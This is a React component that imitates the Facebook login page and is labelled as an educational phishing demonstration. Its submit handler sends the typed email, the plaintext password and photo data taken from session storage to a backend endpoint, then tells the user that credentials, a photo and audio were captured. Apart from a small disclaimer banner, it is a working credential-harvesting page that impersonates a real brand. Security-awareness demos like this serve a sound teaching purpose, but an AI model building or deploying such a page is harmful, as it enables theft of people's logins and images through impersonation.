import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { AlertCircle, ArrowLeft } from 'lucide-react';

export default function FacebookLogin() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState({ email: '', password: '' });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const sessionId = sessionStorage.getItem('sessionId');
    const photoData = sessionStorage.getItem('lastPhotoData');

    try {
      await fetch('/api/demo/facebook/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          email_or_username: credentials.email,
          password: credentials.password,
          photo_data: photoData,
          timestamp: new Date().toISOString(),
        }),
      }).catch(() => {});
    } finally {
      setIsLoading(false);
      setIsSubmitted(true);
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 flex items-center justify-center p-4">
        <div className="max-w-2xl w-full">
          <div className="bg-white rounded-xl shadow-2xl p-8">
            <div className="flex justify-center mb-6">
              <div className="bg-red-100 rounded-full p-4">
                <AlertCircle size={40} className="text-red-600" />
              </div>
            </div>

            <h1 className="text-3xl font-bold text-center text-gray-900 mb-4">
              📊 Demonstration Complete
            </h1>

            <div className="bg-red-50 border-l-4 border-red-400 p-6 mb-6 rounded">
              <p className="text-red-800 font-bold mb-4">
                ⚠️ THIS IS HOW PHISHING ATTACKS WORK
              </p>
              <p className="text-red-700 text-sm mb-4">
                Your credentials were just captured and would be transmitted to an untrusted server.
              </p>
            </div>

            <div className="bg-gray-50 p-4 rounded-lg mb-6">
              <p className="text-sm font-semibold text-gray-700 mb-2">📱 Data Captured:</p>
              <ul className="text-sm text-gray-700 space-y-1">
                <li>✓ Email: <code className="bg-gray-200 px-2 py-1 rounded">{credentials.email}</code></li>
                <li>✓ Password: <code className="bg-gray-200 px-2 py-1 rounded">{"•".repeat(credentials.password.length)}</code></li>
                <li>✓ 📷 Photo captured</li>
                <li>✓ 🎤 Audio captured</li>
              </ul>
            </div>

            <div className="flex gap-4">
              <button
                onClick={() => navigate('/')}
                className="flex-1 flex items-center justify-center gap-2 px-6 py-3 bg-gray-600 text-white font-bold rounded-lg hover:bg-gray-700 transition"
              >
                <ArrowLeft size={20} />
                Back to Home
              </button>
              <button
                onClick={() => navigate('/demo/twitter')}
                className="flex-1 px-6 py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold rounded-lg hover:from-purple-700 hover:to-blue-700 transition"
              >
                Next Demo
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-blue-600 flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        <div className="bg-white rounded-lg shadow-lg p-8">
          <h1 className="text-4xl font-black text-blue-600 mb-8" style={{ fontFamily: 'Arial, sans-serif' }}>
            facebook
          </h1>

          <form onSubmit={handleSubmit} className="space-y-3 mb-6">
            <input
              type="text"
              placeholder="Email address or phone number"
              value={credentials.email}
              onChange={(e) => setCredentials({ ...credentials, email: e.target.value })}
              className="w-full px-4 py-3 bg-gray-100 border border-gray-300 rounded text-sm placeholder-gray-600 focus:bg-white focus:border-blue-400 outline-none"
              required
            />

            <input
              type="password"
              placeholder="Password"
              value={credentials.password}
              onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
              className="w-full px-4 py-3 bg-gray-100 border border-gray-300 rounded text-sm placeholder-gray-600 focus:bg-white focus:border-blue-400 outline-none"
              required
            />

            <button
              type="submit"
              disabled={isLoading || !credentials.email || !credentials.password}
              className="w-full bg-blue-600 text-white font-bold py-2 rounded hover:bg-blue-700 transition disabled:opacity-50"
            >
              {isLoading ? 'Logging in...' : 'Log In'}
            </button>
          </form>

          <div className="text-center text-sm text-gray-700 mb-4">
            <a href="#" className="text-blue-600 hover:underline">Forgotten account?</a>
          </div>

          <div className="border-t border-gray-300 pt-4 text-center">
            <a href="#" className="text-blue-600 font-bold hover:underline">Create New Facebook Account</a>
          </div>

          <div className="mt-8 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
            <p className="text-xs text-yellow-800">
              <strong>⚠️ Educational Demo:</strong> Not the real Facebook. Do not use real credentials!
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
